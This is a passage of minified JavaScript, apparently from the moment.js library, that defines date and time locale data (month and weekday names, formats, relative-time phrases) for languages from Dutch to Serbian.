      , pa = [/^jan/i, /^feb/i, /^maart|mrt.?$/i, /^apr/i, /^mei$/i, /^jun[i.]?$/i, /^jul[i.]?$/i, /^aug/i, /^sep/i, /^okt/i, /^nov/i, /^dec/i]
      , _a = /^(januari|februari|maart|april|mei|april|ju[nl]i|augustus|september|oktober|november|december|jan\.?|feb\.?|mrt\.?|apr\.?|ju[nl]\.?|aug\.?|sep\.?|okt\.?|nov\.?|dec\.?)/i;
    _.defineLocale("nl", {
        months: "januari_februari_maart_april_mei_juni_juli_augustus_september_oktober_november_december".split("_"),
        monthsShort: function(e, t) {
            return /-MMM-/.test(t) ? fa[e.month()] : ma[e.month()]
        },
        monthsRegex: _a,
        monthsShortRegex: _a,
        monthsStrictRegex: /^(januari|februari|maart|mei|ju[nl]i|april|augustus|september|oktober|november|december)/i,
        monthsShortStrictRegex: /^(jan\.?|feb\.?|mrt\.?|apr\.?|mei|ju[nl]\.?|aug\.?|sep\.?|okt\.?|nov\.?|dec\.?)/i,
        monthsParse: pa,
        longMonthsParse: pa,
        shortMonthsParse: pa,
        weekdays: "zondag_maandag_dinsdag_woensdag_donderdag_vrijdag_zaterdag".split("_"),
        weekdaysShort: "zo._ma._di._wo._do._vr._za.".split("_"),
        weekdaysMin: "Zo_Ma_Di_Wo_Do_Vr_Za".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD-MM-YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[vandaag om] LT",
            nextDay: "[morgen om] LT",
            nextWeek: "dddd [om] LT",
            lastDay: "[gisteren om] LT",
            lastWeek: "[afgelopen] dddd [om] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "over %s",
            past: "%s geleden",
            s: "een paar seconden",
            m: "één minuut",
            mm: "%d minuten",
            h: "één uur",
            hh: "%d uur",
            d: "één dag",
            dd: "%d dagen",
            M: "één maand",
            MM: "%d maanden",
            y: "één jaar",
            yy: "%d jaar"
        },
        ordinalParse: /\d{1,2}(ste|de)/,
        ordinal: function(e) {
            return e + (1 === e || 8 === e || 20 <= e ? "ste" : "de")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("nn", {
        months: "januar_februar_mars_april_mai_juni_juli_august_september_oktober_november_desember".split("_"),
        monthsShort: "jan_feb_mar_apr_mai_jun_jul_aug_sep_okt_nov_des".split("_"),
        weekdays: "sundag_måndag_tysdag_onsdag_torsdag_fredag_laurdag".split("_"),
        weekdaysShort: "sun_mån_tys_ons_tor_fre_lau".split("_"),
        weekdaysMin: "su_må_ty_on_to_fr_lø".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY [kl.] H:mm",
            LLLL: "dddd D. MMMM YYYY [kl.] HH:mm"
        },
        calendar: {
            sameDay: "[I dag klokka] LT",
            nextDay: "[I morgon klokka] LT",
            nextWeek: "dddd [klokka] LT",
            lastDay: "[I går klokka] LT",
            lastWeek: "[Føregåande] dddd [klokka] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "om %s",
            past: "%s sidan",
            s: "nokre sekund",
            m: "eit minutt",
            mm: "%d minutt",
            h: "ein time",
            hh: "%d timar",
            d: "ein dag",
            dd: "%d dagar",
            M: "ein månad",
            MM: "%d månader",
            y: "eit år",
            yy: "%d år"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var ga = {
        1: "੧",
        2: "੨",
        3: "੩",
        4: "੪",
        5: "੫",
        6: "੬",
        7: "੭",
        8: "੮",
        9: "੯",
        0: "੦"
    }
      , ya = {
        "੧": "1",
        "੨": "2",
        "੩": "3",
        "੪": "4",
        "੫": "5",
        "੬": "6",
        "੭": "7",
        "੮": "8",
        "੯": "9",
        "੦": "0"
    };
    _.defineLocale("pa-in", {
        months: "ਜਨਵਰੀ_ਫ਼ਰਵਰੀ_ਮਾਰਚ_ਅਪ੍ਰੈਲ_ਮਈ_ਜੂਨ_ਜੁਲਾਈ_ਅਗਸਤ_ਸਤੰਬਰ_ਅਕਤੂਬਰ_ਨਵੰਬਰ_ਦਸੰਬਰ".split("_"),
        monthsShort: "ਜਨਵਰੀ_ਫ਼ਰਵਰੀ_ਮਾਰਚ_ਅਪ੍ਰੈਲ_ਮਈ_ਜੂਨ_ਜੁਲਾਈ_ਅਗਸਤ_ਸਤੰਬਰ_ਅਕਤੂਬਰ_ਨਵੰਬਰ_ਦਸੰਬਰ".split("_"),
        weekdays: "ਐਤਵਾਰ_ਸੋਮਵਾਰ_ਮੰਗਲਵਾਰ_ਬੁਧਵਾਰ_ਵੀਰਵਾਰ_ਸ਼ੁੱਕਰਵਾਰ_ਸ਼ਨੀਚਰਵਾਰ".split("_"),
        weekdaysShort: "ਐਤ_ਸੋਮ_ਮੰਗਲ_ਬੁਧ_ਵੀਰ_ਸ਼ੁਕਰ_ਸ਼ਨੀ".split("_"),
        weekdaysMin: "ਐਤ_ਸੋਮ_ਮੰਗਲ_ਬੁਧ_ਵੀਰ_ਸ਼ੁਕਰ_ਸ਼ਨੀ".split("_"),
        longDateFormat: {
            LT: "A h:mm ਵਜੇ",
            LTS: "A h:mm:ss ਵਜੇ",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm ਵਜੇ",
            LLLL: "dddd, D MMMM YYYY, A h:mm ਵਜੇ"
        },
        calendar: {
            sameDay: "[ਅਜ] LT",
            nextDay: "[ਕਲ] LT",
            nextWeek: "dddd, LT",
            lastDay: "[ਕਲ] LT",
            lastWeek: "[ਪਿਛਲੇ] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s ਵਿੱਚ",
            past: "%s ਪਿਛਲੇ",
            s: "ਕੁਝ ਸਕਿੰਟ",
            m: "ਇਕ ਮਿੰਟ",
            mm: "%d ਮਿੰਟ",
            h: "ਇੱਕ ਘੰਟਾ",
            hh: "%d ਘੰਟੇ",
            d: "ਇੱਕ ਦਿਨ",
            dd: "%d ਦਿਨ",
            M: "ਇੱਕ ਮਹੀਨਾ",
            MM: "%d ਮਹੀਨੇ",
            y: "ਇੱਕ ਸਾਲ",
            yy: "%d ਸਾਲ"
        },
        preparse: function(e) {
            return e.replace(/[੧੨੩੪੫੬੭੮੯੦]/g, function(e) {
                return ya[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return ga[e]
            })
        },
        meridiemParse: /ਰਾਤ|ਸਵੇਰ|ਦੁਪਹਿਰ|ਸ਼ਾਮ/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "ਰਾਤ" === t ? e < 4 ? e : e + 12 : "ਸਵੇਰ" === t ? e : "ਦੁਪਹਿਰ" === t ? 10 <= e ? e : e + 12 : "ਸ਼ਾਮ" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "ਰਾਤ" : e < 10 ? "ਸਵੇਰ" : e < 17 ? "ਦੁਪਹਿਰ" : e < 20 ? "ਸ਼ਾਮ" : "ਰਾਤ"
        },
        week: {
            dow: 0,
            doy: 6
        }
    });
    var va = "styczeń_luty_marzec_kwiecień_maj_czerwiec_lipiec_sierpień_wrzesień_październik_listopad_grudzień".split("_")
      , Ma = "stycznia_lutego_marca_kwietnia_maja_czerwca_lipca_sierpnia_września_października_listopada_grudnia".split("_");
    _.defineLocale("pl", {
        months: function(e, t) {
            return "" === t ? "(" + Ma[e.month()] + "|" + va[e.month()] + ")" : /D MMMM/.test(t) ? Ma[e.month()] : va[e.month()]
        },
        monthsShort: "sty_lut_mar_kwi_maj_cze_lip_sie_wrz_paź_lis_gru".split("_"),
        weekdays: "niedziela_poniedziałek_wtorek_środa_czwartek_piątek_sobota".split("_"),
        weekdaysShort: "ndz_pon_wt_śr_czw_pt_sob".split("_"),
        weekdaysMin: "Nd_Pn_Wt_Śr_Cz_Pt_So".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Dziś o] LT",
            nextDay: "[Jutro o] LT",
            nextWeek: "[W] dddd [o] LT",
            lastDay: "[Wczoraj o] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[W zeszłą niedzielę o] LT";
                case 3:
                    return "[W zeszłą środę o] LT";
                case 6:
                    return "[W zeszłą sobotę o] LT";
                default:
                    return "[W zeszły] dddd [o] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "%s temu",
            s: "kilka sekund",
            m: _t,
            mm: _t,
            h: _t,
            hh: _t,
            d: "1 dzień",
            dd: "%d dni",
            M: "miesiąc",
            MM: _t,
            y: "rok",
            yy: _t
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("pt-br", {
        months: "Janeiro_Fevereiro_Março_Abril_Maio_Junho_Julho_Agosto_Setembro_Outubro_Novembro_Dezembro".split("_"),
        monthsShort: "Jan_Fev_Mar_Abr_Mai_Jun_Jul_Ago_Set_Out_Nov_Dez".split("_"),
        weekdays: "Domingo_Segunda-feira_Terça-feira_Quarta-feira_Quinta-feira_Sexta-feira_Sábado".split("_"),
        weekdaysShort: "Dom_Seg_Ter_Qua_Qui_Sex_Sáb".split("_"),
        weekdaysMin: "Dom_2ª_3ª_4ª_5ª_6ª_Sáb".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D [de] MMMM [de] YYYY",
            LLL: "D [de] MMMM [de] YYYY [às] HH:mm",
            LLLL: "dddd, D [de] MMMM [de] YYYY [às] HH:mm"
        },
        calendar: {
            sameDay: "[Hoje às] LT",
            nextDay: "[Amanhã às] LT",
            nextWeek: "dddd [às] LT",
            lastDay: "[Ontem às] LT",
            lastWeek: function() {
                return 0 === this.day() || 6 === this.day() ? "[Último] dddd [às] LT" : "[Última] dddd [às] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "em %s",
            past: "%s atrás",
            s: "poucos segundos",
            m: "um minuto",
            mm: "%d minutos",
            h: "uma hora",
            hh: "%d horas",
            d: "um dia",
            dd: "%d dias",
            M: "um mês",
            MM: "%d meses",
            y: "um ano",
            yy: "%d anos"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº"
    }),
    _.defineLocale("pt", {
        months: "Janeiro_Fevereiro_Março_Abril_Maio_Junho_Julho_Agosto_Setembro_Outubro_Novembro_Dezembro".split("_"),
        monthsShort: "Jan_Fev_Mar_Abr_Mai_Jun_Jul_Ago_Set_Out_Nov_Dez".split("_"),
        weekdays: "Domingo_Segunda-Feira_Terça-Feira_Quarta-Feira_Quinta-Feira_Sexta-Feira_Sábado".split("_"),
        weekdaysShort: "Dom_Seg_Ter_Qua_Qui_Sex_Sáb".split("_"),
        weekdaysMin: "Dom_2ª_3ª_4ª_5ª_6ª_Sáb".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D [de] MMMM [de] YYYY",
            LLL: "D [de] MMMM [de] YYYY HH:mm",
            LLLL: "dddd, D [de] MMMM [de] YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Hoje às] LT",
            nextDay: "[Amanhã às] LT",
            nextWeek: "dddd [às] LT",
            lastDay: "[Ontem às] LT",
            lastWeek: function() {
                return 0 === this.day() || 6 === this.day() ? "[Último] dddd [às] LT" : "[Última] dddd [às] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "em %s",
            past: "há %s",
            s: "segundos",
            m: "um minuto",
            mm: "%d minutos",
            h: "uma hora",
            hh: "%d horas",
            d: "um dia",
            dd: "%d dias",
            M: "um mês",
            MM: "%d meses",
            y: "um ano",
            yy: "%d anos"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("ro", {
        months: "ianuarie_februarie_martie_aprilie_mai_iunie_iulie_august_septembrie_octombrie_noiembrie_decembrie".split("_"),
        monthsShort: "ian._febr._mart._apr._mai_iun._iul._aug._sept._oct._nov._dec.".split("_"),
        monthsParseExact: !0,
        weekdays: "duminică_luni_marți_miercuri_joi_vineri_sâmbătă".split("_"),
        weekdaysShort: "Dum_Lun_Mar_Mie_Joi_Vin_Sâm".split("_"),
        weekdaysMin: "Du_Lu_Ma_Mi_Jo_Vi_Sâ".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY H:mm",
            LLLL: "dddd, D MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[azi la] LT",
            nextDay: "[mâine la] LT",
            nextWeek: "dddd [la] LT",
            lastDay: "[ieri la] LT",
            lastWeek: "[fosta] dddd [la] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "peste %s",
            past: "%s în urmă",
            s: "câteva secunde",
            m: "un minut",
            mm: gt,
            h: "o oră",
            hh: gt,
            d: "o zi",
            dd: gt,
            M: "o lună",
            MM: gt,
            y: "un an",
            yy: gt
        },
        week: {
            dow: 1,
            doy: 7
        }
    });
    var La = [/^янв/i, /^фев/i, /^мар/i, /^апр/i, /^ма[йя]/i, /^июн/i, /^июл/i, /^авг/i, /^сен/i, /^окт/i, /^ноя/i, /^дек/i];
    _.defineLocale("ru", {
        months: {
            format: "января_февраля_марта_апреля_мая_июня_июля_августа_сентября_октября_ноября_декабря".split("_"),
            standalone: "январь_февраль_март_апрель_май_июнь_июль_август_сентябрь_октябрь_ноябрь_декабрь".split("_")
        },
        monthsShort: {
            format: "янв._февр._мар._апр._мая_июня_июля_авг._сент._окт._нояб._дек.".split("_"),
            standalone: "янв._февр._март_апр._май_июнь_июль_авг._сент._окт._нояб._дек.".split("_")
        },
        weekdays: {
            standalone: "воскресенье_понедельник_вторник_среда_четверг_пятница_суббота".split("_"),
            format: "воскресенье_понедельник_вторник_среду_четверг_пятницу_субботу".split("_"),
            isFormat: /\[ ?[Вв] ?(?:прошлую|следующую|эту)? ?\] ?dddd/
        },
        weekdaysShort: "вс_пн_вт_ср_чт_пт_сб".split("_"),
        weekdaysMin: "вс_пн_вт_ср_чт_пт_сб".split("_"),
        monthsParse: La,
        longMonthsParse: La,
        shortMonthsParse: La,
        monthsRegex: /^(январ[ья]|янв\.?|феврал[ья]|февр?\.?|марта?|мар\.?|апрел[ья]|апр\.?|ма[йя]|июн[ья]|июн\.?|июл[ья]|июл\.?|августа?|авг\.?|сентябр[ья]|сент?\.?|октябр[ья]|окт\.?|ноябр[ья]|нояб?\.?|декабр[ья]|дек\.?)/i,
        monthsShortRegex: /^(январ[ья]|янв\.?|феврал[ья]|февр?\.?|марта?|мар\.?|апрел[ья]|апр\.?|ма[йя]|июн[ья]|июн\.?|июл[ья]|июл\.?|августа?|авг\.?|сентябр[ья]|сент?\.?|октябр[ья]|окт\.?|ноябр[ья]|нояб?\.?|декабр[ья]|дек\.?)/i,
        monthsStrictRegex: /^(январ[яь]|феврал[яь]|марта?|апрел[яь]|ма[яй]|июн[яь]|июл[яь]|августа?|сентябр[яь]|октябр[яь]|ноябр[яь]|декабр[яь])/i,
        monthsShortStrictRegex: /^(янв\.|февр?\.|мар[т.]|апр\.|ма[яй]|июн[ья.]|июл[ья.]|авг\.|сент?\.|окт\.|нояб?\.|дек\.)/i,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY г.",
            LLL: "D MMMM YYYY г., HH:mm",
            LLLL: "dddd, D MMMM YYYY г., HH:mm"
        },
        calendar: {
            sameDay: "[Сегодня в] LT",
            nextDay: "[Завтра в] LT",
            lastDay: "[Вчера в] LT",
            nextWeek: function(e) {
                if (e.week() === this.week())
                    return 2 === this.day() ? "[Во] dddd [в] LT" : "[В] dddd [в] LT";
                switch (this.day()) {
                case 0:
                    return "[В следующее] dddd [в] LT";
                case 1:
                case 2:
                case 4:
                    return "[В следующий] dddd [в] LT";
                case 3:
                case 5:
                case 6:
                    return "[В следующую] dddd [в] LT"
                }
            },
            lastWeek: function(e) {
                if (e.week() === this.week())
                    return 2 === this.day() ? "[Во] dddd [в] LT" : "[В] dddd [в] LT";
                switch (this.day()) {
                case 0:
                    return "[В прошлое] dddd [в] LT";
                case 1:
                case 2:
                case 4:
                    return "[В прошлый] dddd [в] LT";
                case 3:
                case 5:
                case 6:
                    return "[В прошлую] dddd [в] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "через %s",
            past: "%s назад",
            s: "несколько секунд",
            m: yt,
            mm: yt,
            h: "час",
            hh: yt,
            d: "день",
            dd: yt,
            M: "месяц",
            MM: yt,
            y: "год",
            yy: yt
        },
        meridiemParse: /ночи|утра|дня|вечера/i,
        isPM: function(e) {
            return /^(дня|вечера)$/.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "ночи" : e < 12 ? "утра" : e < 17 ? "дня" : "вечера"
        },
        ordinalParse: /\d{1,2}-(й|го|я)/,
        ordinal: function(e, t) {
            switch (t) {
            case "M":
            case "d":
            case "DDD":
                return e + "-й";
            case "D":
                return e + "-го";
            case "w":
            case "W":
                return e + "-я";
            default:
                return e
            }
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("se", {
        months: "ođđajagemánnu_guovvamánnu_njukčamánnu_cuoŋománnu_miessemánnu_geassemánnu_suoidnemánnu_borgemánnu_čakčamánnu_golggotmánnu_skábmamánnu_juovlamánnu".split("_"),
        monthsShort: "ođđj_guov_njuk_cuo_mies_geas_suoi_borg_čakč_golg_skáb_juov".split("_"),
        weekdays: "sotnabeaivi_vuossárga_maŋŋebárga_gaskavahkku_duorastat_bearjadat_lávvardat".split("_"),
        weekdaysShort: "sotn_vuos_maŋ_gask_duor_bear_láv".split("_"),
        weekdaysMin: "s_v_m_g_d_b_L".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "MMMM D. [b.] YYYY",
            LLL: "MMMM D. [b.] YYYY [ti.] HH:mm",
            LLLL: "dddd, MMMM D. [b.] YYYY [ti.] HH:mm"
        },
        calendar: {
            sameDay: "[otne ti] LT",
            nextDay: "[ihttin ti] LT",
            nextWeek: "dddd [ti] LT",
            lastDay: "[ikte ti] LT",
            lastWeek: "[ovddit] dddd [ti] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s geažes",
            past: "maŋit %s",
            s: "moadde sekunddat",
            m: "okta minuhta",
            mm: "%d minuhtat",
            h: "okta diimmu",
            hh: "%d diimmut",
            d: "okta beaivi",
            dd: "%d beaivvit",
            M: "okta mánnu",
            MM: "%d mánut",
            y: "okta jahki",
            yy: "%d jagit"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("si", {
        months: "ජනවාරි_පෙබරවාරි_මාර්තු_අප්‍රේල්_මැයි_ජූනි_ජූලි_අගෝස්තු_සැප්තැම්බර්_ඔක්තෝබර්_නොවැම්බර්_දෙසැම්බර්".split("_"),
        monthsShort: "ජන_පෙබ_මාර්_අප්_මැයි_ජූනි_ජූලි_අගෝ_සැප්_ඔක්_නොවැ_දෙසැ".split("_"),
        weekdays: "ඉරිදා_සඳුදා_අඟහරුවාදා_බදාදා_බ්‍රහස්පතින්දා_සිකුරාදා_සෙනසුරාදා".split("_"),
        weekdaysShort: "ඉරි_සඳු_අඟ_බදා_බ්‍රහ_සිකු_සෙන".split("_"),
        weekdaysMin: "ඉ_ස_අ_බ_බ්‍ර_සි_සෙ".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "a h:mm",
            LTS: "a h:mm:ss",
            L: "YYYY/MM/DD",
            LL: "YYYY MMMM D",
            LLL: "YYYY MMMM D, a h:mm",
            LLLL: "YYYY MMMM D [වැනි] dddd, a h:mm:ss"
        },
        calendar: {
            sameDay: "[අද] LT[ට]",
            nextDay: "[හෙට] LT[ට]",
            nextWeek: "dddd LT[ට]",
            lastDay: "[ඊයේ] LT[ට]",
            lastWeek: "[පසුගිය] dddd LT[ට]",
            sameElse: "L"
        },
        relativeTime: {
            future: "%sකින්",
            past: "%sකට පෙර",
            s: "තත්පර කිහිපය",
            m: "මිනිත්තුව",
            mm: "මිනිත්තු %d",
            h: "පැය",
            hh: "පැය %d",
            d: "දිනය",
            dd: "දින %d",
            M: "මාසය",
            MM: "මාස %d",
            y: "වසර",
            yy: "වසර %d"
        },
        ordinalParse: /\d{1,2} වැනි/,
        ordinal: function(e) {
            return e + " වැනි"
        },
        meridiemParse: /පෙර වරු|පස් වරු|පෙ.ව|ප.ව./,
        isPM: function(e) {
            return "ප.ව." === e || "පස් වරු" === e
        },
        meridiem: function(e, t, n) {
            return 11 < e ? n ? "ප.ව." : "පස් වරු" : n ? "පෙ.ව." : "පෙර වරු"
        }
    });
    var ba = "január_február_marec_apríl_máj_jún_júl_august_september_október_november_december".split("_")
      , ka = "jan_feb_mar_apr_máj_jún_júl_aug_sep_okt_nov_dec".split("_");
    _.defineLocale("sk", {
        months: ba,
        monthsShort: ka,
        weekdays: "nedeľa_pondelok_utorok_streda_štvrtok_piatok_sobota".split("_"),
        weekdaysShort: "ne_po_ut_st_št_pi_so".split("_"),
        weekdaysMin: "ne_po_ut_st_št_pi_so".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[dnes o] LT",
            nextDay: "[zajtra o] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[v nedeľu o] LT";
                case 1:
                case 2:
                    return "[v] dddd [o] LT";
                case 3:
                    return "[v stredu o] LT";
                case 4:
                    return "[vo štvrtok o] LT";
                case 5:
                    return "[v piatok o] LT";
                case 6:
                    return "[v sobotu o] LT"
                }
            },
            lastDay: "[včera o] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[minulú nedeľu o] LT";
                case 1:
                case 2:
                    return "[minulý] dddd [o] LT";
                case 3:
                    return "[minulú stredu o] LT";
                case 4:
                case 5:
                    return "[minulý] dddd [o] LT";
                case 6:
                    return "[minulú sobotu o] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "pred %s",
            s: Mt,
            m: Mt,
            mm: Mt,
            h: Mt,
            hh: Mt,
            d: Mt,
            dd: Mt,
            M: Mt,
            MM: Mt,
            y: Mt,
            yy: Mt
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("sl", {
        months: "januar_februar_marec_april_maj_junij_julij_avgust_september_oktober_november_december".split("_"),
        monthsShort: "jan._feb._mar._apr._maj._jun._jul._avg._sep._okt._nov._dec.".split("_"),
        monthsParseExact: !0,
        weekdays: "nedelja_ponedeljek_torek_sreda_četrtek_petek_sobota".split("_"),
        weekdaysShort: "ned._pon._tor._sre._čet._pet._sob.".split("_"),
        weekdaysMin: "ne_po_to_sr_če_pe_so".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[danes ob] LT",
            nextDay: "[jutri ob] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[v] [nedeljo] [ob] LT";
                case 3:
                    return "[v] [sredo] [ob] LT";
                case 6:
                    return "[v] [soboto] [ob] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[v] dddd [ob] LT"
                }
            },
            lastDay: "[včeraj ob] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[prejšnjo] [nedeljo] [ob] LT";
                case 3:
                    return "[prejšnjo] [sredo] [ob] LT";
                case 6:
                    return "[prejšnjo] [soboto] [ob] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[prejšnji] dddd [ob] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "čez %s",
            past: "pred %s",
            s: Lt,
            m: Lt,
            mm: Lt,
            h: Lt,
            hh: Lt,
            d: Lt,
            dd: Lt,
            M: Lt,
            MM: Lt,
            y: Lt,
            yy: Lt
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("sq", {
        months: "Janar_Shkurt_Mars_Prill_Maj_Qershor_Korrik_Gusht_Shtator_Tetor_Nëntor_Dhjetor".split("_"),
        monthsShort: "Jan_Shk_Mar_Pri_Maj_Qer_Kor_Gus_Sht_Tet_Nën_Dhj".split("_"),
        weekdays: "E Diel_E Hënë_E Martë_E Mërkurë_E Enjte_E Premte_E Shtunë".split("_"),
        weekdaysShort: "Die_Hën_Mar_Mër_Enj_Pre_Sht".split("_"),
        weekdaysMin: "D_H_Ma_Më_E_P_Sh".split("_"),
        weekdaysParseExact: !0,
        meridiemParse: /PD|MD/,
        isPM: function(e) {
            return "M" === e.charAt(0)
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "PD" : "MD"
        },
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Sot në] LT",
            nextDay: "[Nesër në] LT",
            nextWeek: "dddd [në] LT",
            lastDay: "[Dje në] LT",
            lastWeek: "dddd [e kaluar në] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "në %s",
            past: "%s më parë",
            s: "disa sekonda",
            m: "një minutë",
            mm: "%d minuta",
            h: "një orë",
            hh: "%d orë",
            d: "një ditë",
            dd: "%d ditë",
            M: "një muaj",
            MM: "%d muaj",
            y: "një vit",
            yy: "%d vite"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var Da = {
        words: {
            m: ["један минут", "једне минуте"],
            mm: ["минут", "минуте", "минута"],
            h: ["један сат", "једног сата"],
            hh: ["сат", "сата", "сати"],
            dd: ["дан", "дана", "дана"],
            MM: ["месец", "месеца", "месеци"],
            yy: ["година", "године", "година"]
        },
        correctGrammaticalCase: function(e, t) {
            return 1 === e ? t[0] : 2 <= e && e <= 4 ? t[1] : t[2]
        },
        translate: function(e, t, n) {
            var i = Da.words[n];
            return 1 === n.length ? t ? i[0] : i[1] : e + " " + Da.correctGrammaticalCase(e, i)
        }
    };
    _.defineLocale("sr-cyrl", {
        months: "јануар_фебруар_март_април_мај_јун_јул_август_септембар_октобар_новембар_децембар".split("_"),
        monthsShort: "јан._феб._мар._апр._мај_јун_јул_авг._сеп._окт._нов._дец.".split("_"),
        monthsParseExact: !0,
        weekdays: "недеља_понедељак_уторак_среда_четвртак_петак_субота".split("_"),
        weekdaysShort: "нед._пон._уто._сре._чет._пет._суб.".split("_"),
        weekdaysMin: "не_по_ут_ср_че_пе_су".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[данас у] LT",
            nextDay: "[сутра у] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[у] [недељу] [у] LT";
                case 3:
                    return "[у] [среду] [у] LT";
                case 6:
                    return "[у] [суботу] [у] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[у] dddd [у] LT"
                }
            },
            lastDay: "[јуче у] LT",
            lastWeek: function() {
                return ["[прошле] [недеље] [у] LT", "[прошлог] [понедељка] [у] LT", "[прошлог] [уторка] [у] LT", "[прошле] [среде] [у] LT", "[прошлог] [четвртка] [у] LT", "[прошлог] [петка] [у] LT", "[прошле] [суботе] [у] LT"][this.day()]
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "за %s",
            past: "пре %s",
            s: "неколико секунди",
            m: Da.translate,
            mm: Da.translate,
            h: Da.translate,
            hh: Da.translate,
            d: "дан",
            dd: Da.translate,
            M: "месец",
            MM: Da.translate,
            y: "годину",
            yy: Da.translate
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    });
    var Ya = {
        words: {
            m: ["jedan minut", "jedne minute"],
            mm: ["minut", "minute", "minuta"],
            h: ["jedan sat", "jednog sata"],
            hh: ["sat", "sata", "sati"],
            dd: ["dan", "dana", "dana"],
            MM: ["mesec", "meseca", "meseci"],
            yy: ["godina", "godine", "godina"]
        },
        correctGrammaticalCase: function(e, t) {
